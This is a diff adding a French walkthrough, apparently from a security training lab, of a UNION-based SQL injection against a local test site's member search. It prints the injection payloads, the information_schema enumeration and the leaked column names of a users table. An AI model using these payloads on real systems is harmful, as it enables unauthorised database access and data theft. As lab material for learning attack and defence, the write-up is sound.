@@ -1,0 +1,57 @@
+Apres une recherche "test" sur Members, on obtient l'erreur SQL suivante : 
+
+Unknown column 'test' in 'where clause'
+
+Ce qui nous offre une tentative d'injection SQL pour recuperer les informations de la base de donnees
+
+http://192.168.56.102/?page=member&id=test&Submit=Submit#
+
+on remarque d'ID = test, donc en mettant un numero d'id on peut tenter de recuperer une premiere table !
+
+ID: 1 
+First name: one
+Surname : me
+
+En ajoutant la methode UNION, on peut recuperer une autre table et les infos !
+On ne possede pas les noms des column mais grace a information_schema, on peut recuperer toutes les donnees necessaires 
+
+1 UNION SELECT column_name, table_name FROM information_schema.columns
+
+Ce qui nous donne les tables et les columns correspondantes 
+
+ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns 
+First name: user_id
+Surname : users
+
+ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns 
+First name: first_name
+Surname : users
+
+ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns 
+First name: last_name
+Surname : users
+
+ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns 
+First name: town
+Surname : users
+
+ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns 
+First name: country
+Surname : users
+
+ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns 
+First name: planet
+Surname : users
+
+ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns 
+First name: Commentaire
+Surname : users
+
+ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns 
+First name: countersign
+Surname : users
+
+On peut donc recuperer les donnees de la table users avec la commande suivante :
+
+1 UNION SELECT first_name, country FROM users
+
